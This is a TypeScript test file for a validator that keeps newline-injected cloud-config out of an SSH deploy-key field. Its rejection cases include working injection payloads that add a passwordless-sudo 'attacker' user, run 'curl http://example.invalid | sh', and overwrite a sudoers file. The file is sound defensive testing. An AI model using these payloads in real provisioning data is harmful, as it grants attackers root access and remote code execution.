import { describe, expect, it } from 'vitest';

import { assertDeployPublicKey } from './cloudInit';

/**
 * `renderCloudInit` builds a `#cloud-config` document that creates the `deploy`
 * account, installs its `authorized_keys` entry, and writes a sudoers drop-in
 * granting that account a root command. The only value flowing into it from
 * stack configuration is the public key, and a newline in it appends arbitrary
 * cloud-config to the document.
 *
 * Three properties make that permanent rather than merely wrong: cloud-init
 * runs once and never again, `userData` is create-time-only at the provider,
 * and it sits in the component's `ignoreChanges` — so an injected document
 * survives every later apply and appears in no diff. There is no second
 * control behind this one.
 */

const ED25519 = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE';

describe('assertDeployPublicKey', () => {
  it('accepts an ed25519 key with a comment', () => {
    expect(assertDeployPublicKey(`${ED25519} deploy@edge1`)).toBe(`${ED25519} deploy@edge1`);
  });

  it('accepts a key with no comment', () => {
    expect(assertDeployPublicKey(ED25519)).toBe(ED25519);
  });

  it('accepts rsa, ecdsa and security-key types', () => {
    const blob = 'AAAAB3NzaC1yc2EAAAADAQABAAABgQexample';
    for (const type of [
      'ssh-rsa',
      'ecdsa-sha2-nistp256',
      'ecdsa-sha2-nistp384',
      'ecdsa-sha2-nistp521',
      'sk-ssh-ed25519@openssh.com',
      'sk-ecdsa-sha2-nistp256@openssh.com',
    ]) {
      expect(() => assertDeployPublicKey(`${type} ${blob}`)).not.toThrow();
    }
  });

  it('accepts base64 padding', () => {
    expect(() => assertDeployPublicKey('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA==')).not.toThrow();
  });

  it('accepts spaces after the blob, because that is the comment field', () => {
    // `ssh-keygen -C 'deploy on edge1'` produces exactly this. The property
    // being defended is that the value cannot end its line, not that it is a
    // well-formed key — anything after the blob is a comment by definition.
    expect(() => assertDeployPublicKey(`${ED25519} deploy on edge1`)).not.toThrow();
  });

  describe('rejects anything that can end the line it is on', () => {
    // Each of these is a working cloud-config injection if it reaches the
    // template. The last two are the ones a copy-paste produces by accident,
    // which is why a trailing newline is a rejection and not trimmed away.
    const injections: Record<string, string> = {
      'a second users entry granting a shell': `${ED25519} x\nusers:\n  - name: attacker\n    sudo: ALL=(ALL) NOPASSWD:ALL`,
      'a runcmd': `${ED25519} x\nruncmd:\n  - [ sh, -c, "curl http://example.invalid | sh" ]`,
      'a write_files replacing the sudoers drop-in': `${ED25519} x\nwrite_files:\n  - path: /etc/sudoers.d/50-branchleft-deploy\n    content: "deploy ALL=(ALL) NOPASSWD:ALL"`,
      'a carriage return': `${ED25519}\rruncmd: []`,
      'a trailing newline from `cat`': `${ED25519}\n`,
      'a leading newline': `\n${ED25519}`,
    };
    for (const [name, value] of Object.entries(injections)) {
      it(name, () => {
        expect(() => assertDeployPublicKey(value)).toThrow(/single-line OpenSSH public key/);
      });
    }
  });

  describe('rejects values that are not a public key at all', () => {
    const rejected: Record<string, string> = {
      empty: '',
      'whitespace only': '   ',
      'a private key': '-----BEGIN OPENSSH PRIVATE KEY-----',
      'a bare comment': 'deploy@edge1',
      'an unknown key type': `ssh-dss ${'A'.repeat(20)}`,
      'a type with no blob': 'ssh-ed25519',
      'a blob with YAML metacharacters': 'ssh-ed25519 AAAA:BBBB',
      'a path rather than a key': '~/.ssh/id_ed25519.pub',
    };
    for (const [name, value] of Object.entries(rejected)) {
      it(name, () => {
        expect(() => assertDeployPublicKey(value)).toThrow();
      });
    }
  });

  it('names the value rather than echoing it, so a rejection is not a disclosure', () => {
    // The key is public, but the same message shape would carry a private one
    // pasted into the wrong config key by mistake.
    try {
      assertDeployPublicKey('-----BEGIN OPENSSH PRIVATE KEY-----\nsecret-material');
      expect.unreachable('should have thrown');
    } catch (error) {
      expect((error as Error).message).not.toContain('secret-material');
    }
  });
});
